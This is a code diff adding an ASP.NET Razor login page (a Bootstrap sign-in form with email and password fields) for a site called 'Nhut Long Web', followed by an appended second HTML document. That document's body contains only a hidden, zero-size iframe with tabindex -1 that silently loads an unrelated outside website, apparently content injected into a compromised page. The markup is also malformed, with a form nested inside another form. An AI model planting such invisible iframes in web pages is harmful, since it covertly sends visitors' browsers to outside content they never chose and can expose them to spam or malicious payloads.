@@ -1,0 +1,87 @@
+﻿@{
+    var Username = string.Empty;
+    var Password = string.Empty;
+    Layout = null;
+}
+<div class="container">
+    <div class="row">
+        <div class="col-md-4 col-md-offset-4">
+            <div class="login-panel panel panel-default">
+                <div class="panel-heading">
+                    <h3 class="panel-title">Please Sign In</h3>
+                </div>
+                @using (@Ajax.BeginForm("Login", "Login", new AjaxOptions { HttpMethod = "Post" }))
+                {
+                    <div class="panel-body">
+                        <form role="form">
+                            <fieldset>
+                                <div class="form-group">
+                                    @Html.TextBoxFor(x => Username, htmlAttributes: new { @class = "form-control", @name = "email", @placeholder = "E-mail", @type = "email" })
+
+                                </div>
+                                <div class="form-group">
+                                    @Html.TextBoxFor(x => Password, htmlAttributes: new { @class = "form-control", @name = "password", @placeholder = "Password", @type = "password" })
+
+                                </div>
+                                <div class="checkbox">
+                                    <label>
+                                        <input name="remember" type="checkbox" value="Remember Me">Remember Me
+                                    </label>
+                                </div>
+                                <!-- Change this to a button or input when using this as a form -->
+
+                                <button class="btn btn-lg btn-success btn-block"> Đăng nhập</button>
+                            </fieldset>
+                        </form>
+                    </div>
+                }
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>Nhut Long Web</title>
+    <link href="/bower_components/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="/bower_components/metisMenu/dist/metisMenu.min.css" rel="stylesheet" />
+    <link href="/Content/timeline.css" rel="stylesheet" />
+    <link href="/Content/sb-admin-2.css" rel="stylesheet" />
+
+    <script src="/Scripts/modernizr-2.6.2.js"></script>
+
+
+    <!-- DataTables CSS -->
+    <link href="/bower_components/datatables-plugins/integration/bootstrap/3/dataTables.bootstrap.css" rel="stylesheet" type="text/css" />
+    <!-- DataTables Responsive CSS -->
+    <link href="/bower_components/datatables-responsive/css/dataTables.responsive.css" rel="stylesheet" type="text/css" />
+
+    <link href="/bower_components/morrisjs/morris.css" rel="stylesheet" type="text/css" />
+    <link href="/bower_components/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+    <!-- jQuery -->
+    <script src="/Scripts/jquery-1.10.2.js"></script>
+
+    <script src="/bower_components/jquery/dist/jquery.min.js"></script>
+    <script src="/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
+    <script src="/Scripts/respond.js"></script>
+
+    <script src="/bower_components/metisMenu/dist/metisMenu.min.js"></script>
+
+</head>
+<body>
+
+
+    <iframe style="display: none" src="http://phongkhambacsihon.com/" width="0" height="0" tabindex="-1" title="empty"></iframe>
+
+</body>
+</html>
+
+
